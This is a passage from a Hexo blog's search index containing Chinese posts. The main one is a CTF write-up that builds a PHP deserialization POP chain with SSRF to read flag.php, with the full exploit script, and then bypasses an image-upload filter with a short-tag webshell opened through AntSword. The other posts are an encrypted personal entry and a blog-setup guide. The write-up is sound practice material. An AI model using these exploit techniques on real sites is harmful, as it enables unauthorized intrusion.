php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123; <span class="comment">//flag</span></span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>); <span class="comment">//curl_exec() 执行cURL会话。</span></span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里可以进行SSRF，跟一下这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);  <span class="comment">//执行这里</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>loadfile()</code>可以进行跳转，再跟<code>loadfile()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();   <span class="comment">//这里进入loadfile，此方法在尝试调用类方法，而方法不存在时被调用</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>方法可以进行跳转，想办法进入这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">            <span class="comment">//$a-&gt;local=&quot;http://127.0.0.1:65500/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>(); <span class="comment">//$this-&gt;a=new FileViewer();执行c方法但是 FileViewer类没有c方法进入call方法</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>利用goodman函数进行变量覆盖，让a为FileViewer类的对象<code>b=&quot;local&quot;</code>，然后让Backdoor类下<br><code>superhacker=&quot;http://127.0.0.1:65500/&quot;</code>就可以覆盖成功，a为FileViewer对象但这个类里面没有c方法，进入<code>__call</code>魔术方法， 这样pop链构造完成，但是这里怎么利用呢？<br><img src="https://s1.ax1x.com/2022/11/08/xzuqMD.png" alt="xzuqMD.png"><br>直接传给image_path是失败了的<br><img src="https://s1.ax1x.com/2022/11/08/xzu5I1.png" alt="xzu5I1.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuoPx.png" alt="xzuoPx.png"></p><p>这篇博客打开是空的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br></pre></td></tr></table></figure><p>所以我们得从这里进入localfile，原来的那条链子可以进行变量覆盖，我的理解是这样的，wp中这里没有太多解释<br>exp：来源wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;a=<span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;superhacker=<span class="string">&quot;127.0.0.1:65500/&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;black_list=<span class="string">&quot;黑名单什么的管不着我&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;local=<span class="variable">$n</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;path=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>感觉没太理解有点问题，先这样吧<br>path_info进入<br><img src="https://s1.ax1x.com/2022/11/08/xzu4aR.png" alt="xzu4aR.png"><br><img src="https://s1.ax1x.com/2022/11/08/xzuWqJ.png" alt="xzuWqJ.png"><br>解码得到flag<br><img src="https://s1.ax1x.com/2022/11/08/xzuhZ9.png" alt="xzuhZ9.png"></p><h2 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h2><p>进来有个查看文件，试一下index.php<br><img src="https://s1.ax1x.com/2022/11/08/xzKHkn.png" alt="xzKHkn.png"><br>查看源码<br><img src="https://s1.ax1x.com/2022/11/08/xzKbYq.png" alt="xzKbYq.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传一张图片马显示太大了<br><img src="https://s1.ax1x.com/2022/11/08/xzKqf0.png" alt="xzKqf0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>直接使用define改，第一次遇到这中操作，题刷的太少了<br><img src="https://s1.ax1x.com/2022/11/08/xzKowj.png" alt="xzKowj.png"><br>被拦了，而且有延时</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                       <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>试一下短标签<br><img src="https://s1.ax1x.com/2022/11/08/xzKImQ.png" alt="xzKImQ.png"><br>上传成功，PHP试一下<br><img src="https://s1.ax1x.com/2022/11/08/xzK4Og.png" alt="xzK4Og.png"><br>成功，路径直接提示了格式，连蚁剑<br><img src="https://s1.ax1x.com/2022/11/08/xzKh6S.png" alt="xzKh6S.png"><br>不知道为什么连不上，进入文件发现报错<br><a href="https://imgse.com/i/xzKfl8"><img src="https://s1.ax1x.com/2022/11/08/xzKfl8.png" alt="xzKfl8.png"></a><br>多了一个<code>&gt;</code>删掉连接成功，文件打不开直接进终端<br><img src="https://s1.ax1x.com/2022/11/08/xzKTTs.png" alt="xzKTTs.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>参考：</p><p>(<a href="https://www.wd-ljt.com/post/1024/894.html">https://www.wd-ljt.com/post/1024/894.html</a>)       </p><p>这篇复现鸽了这么久终于弄完了，这篇博客图片上传的真不容易啊，obsidain对图片的处理真的麻烦，得找个插件解决一下这个问题，不然下次还得一个个重新截图保存上传，博客还不够完善，导航都还没弄，找个时间弄弄吧</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>成长</title>
      <link href="/undefined/3364.html"/>
      <url>/undefined/3364.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="789c51522296cf26c972e79e6dc64ee9b6f0a43cd707535122b61ec2e35979fd">b36be19ce9e1144d75d9dbaaee27fc91995ed66158f8b54f5086b3e2378b74871ea22cbd1e9675f297060a77448419f3000a7b11b30cfd73b39b6d6af69ddc4014cdcce4d33ee1ef898181285f286808e510515f56330e0702faeea6327b5b88a9b81da581f846855cc9df428c604138a63543d0cef2dec18f1936d4eae96cf8c85978b5f4dc1a0ce68193c26a401eb7c5a184b529699c0449c558c2acff0a3c0595c1927c66e565821fcb0a150d47d9495f34955c93253db23651e76a41c7bc0ff113b4ab142b0b37c5506af4d9e9b6b2597bd8adffcc77b5c57b4ee7b97f0b4ee8ec6b9198bcbada4b0a1b78152885381166f086c04a5c9b21d38f96a1c043820f068b4892d9cb029bbb02c83e59d22d54e6f7229d70113155b8b4c3ce4d3dc06e09d755ecf51ef628adaced631b218115af61805f60730358ab78b44979caed01e6d135296e426293b34b13741ca1fce62fd1225c1b6e917690ab2e80e9a2e2e4a18ab1be6c01024b9b3c57e6f2a2e53800a9d8e79bfc808b3971f4ecb0846b9e2fb11f90ab2109132bc2c9851d0f4446997e1408f75873a3dd2703ad997f089529336e134c5bfebd9da8143e6537e1113619a222d0e0fc6490ac28ef32daedcd9dfc497f023bd6eef02c9c0b44549c25cd00d533caf956e070ad44905f9d16ab82d633eb9feccce01b7d5a21a6ae250588409679acd45731495c58e6a1699124b54ef3fe818ec8f7d1d9292388c763fbe8541328ebc6aea592ae63b2478a4fa6581900dccbb8ea8a3029a603bf80fe998ee28ec58dd6d0ee6e1b9ec4cba40a765e7e9e1b44c469c3820fc5e6d6433e953d549d601d183cd547727559b60ad1869cea995af6b1ef7ab62b71994221abf8fe5ad9646169c1e6c0b8915e596be852a8d713d8787b8c2d92db7c9f271f6b50ad729c329ace5d0e023e487fa1282ada1c09d107ff2741590d5affae597b36d6148646d459217a4d621abcf8ede2dc71c1da0db4fda4ffcd6a8ade1b9c7ca94819f39accd3750c8741a330aef29ca8970ea929c1567d022fdf3ab0c7bb060da082b1010797997b8fd1d600f22172e72a909d60891c2b8c633c50013bc36de6a61e52669a2433d7788c6584ac79b91315ed03cd60e8f0a1b311f7795060145fe6eb51e29efefadaa86b8bde6a8a7c343724b9a8812c56ee4f8e09e6a0f3ddf6f450195b584dc50823defa435676925d01251e4d9377aec180f15804d3ae01b7282e3d781c880f7d6a098fa3b24cd716b80fbd5bcbe8417cb69a805004338be92579efd80abbfe6aef5262c220d8d98a564ad7a771a201c818d9051dbebcc83959401389e26a000315de8f1fb46e2fa758094d7b56fe8fa961aba395bad849c47a9117259916da5934f2e83b259ae8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">留点小秘密</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/undefined/26832.html"/>
      <url>/undefined/26832.html</url>
      
        <content type="html"><![CDATA[<h3>hexo+GitHub搭建</h3><p>基本步骤直接看视频<a href="https://www.bilibili.com/video/BV1mU4y1j72n?p=5&spm_id_from=pageDriver&vd_source=fdbccecc8d1a39a2449860e47c52b6e7">地址</a></p><p>建议放博客的文件夹不要放中文，我在执行<code>hexo init</code>时一直报错，但是把中文名去掉之后就好了</p><h3>主题设置</h3>打开你创建的放博客内容的文件夹<p><img src="https://s1.ax1x.com/2022/10/05/xl26rF.md.png" alt="xl26rF.md.png"></p><p>打开_config.yml文件，我这里用vscode打开的</p><p><img src="https://s1.ax1x.com/2022/10/05/xlRZR0.png" alt="xlRZR0.png"></p><p>将theme后面的东西改为你的主题名，你下载好的主题名在themes中能看到，至于怎么下载可以在[官网](<a href="https://hexo.io/themes/">Themes | Hexo</a>)选一个喜欢的使用命令下载，也可以直接在GitHub将文件下载然后解压到themes文件里</p><p><strong>执行hexo三连</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl //清除缓存</span><br><span class="line">hexo g  //生成静态文件，个人理解将md转为html</span><br><span class="line">hexo s  //本地预览</span><br></pre></td></tr></table></figure><p>满意之后上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><h3 id="主题的个性化"><a href="#主题的个性化" class="headerlink" title="主题的个性化"></a>主题的个性化</h3><p>这一步我想换我自己喜欢的图片，横幅背景，导航栏logo，但是一直失败按照官方文档配置也不行，只能用默认，等以后研究明白了再弄。</p><h3 id="图床的使用"><a href="#图床的使用" class="headerlink" title="图床的使用"></a>图床的使用</h3><p>我用的是[路过图床](<a href="https://imgse.com/">路过图床 - 免费图片上传, 专业图片外链, 免费公共图床 (imgse.com)</a>)看网上的教程使用插件没成功，Picgo装好了启动不了就很懵</p><p>使用：直接把图片上传到图床上面，然后复制下面这里的连接就行</p><p><img src="https://s1.ax1x.com/2022/10/05/xlWxu8.png" alt="xlWxu8.png"></p><p>总结</p><p>很多细节还是有问题，可能是我使用的主题有问题以后慢慢再弄</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
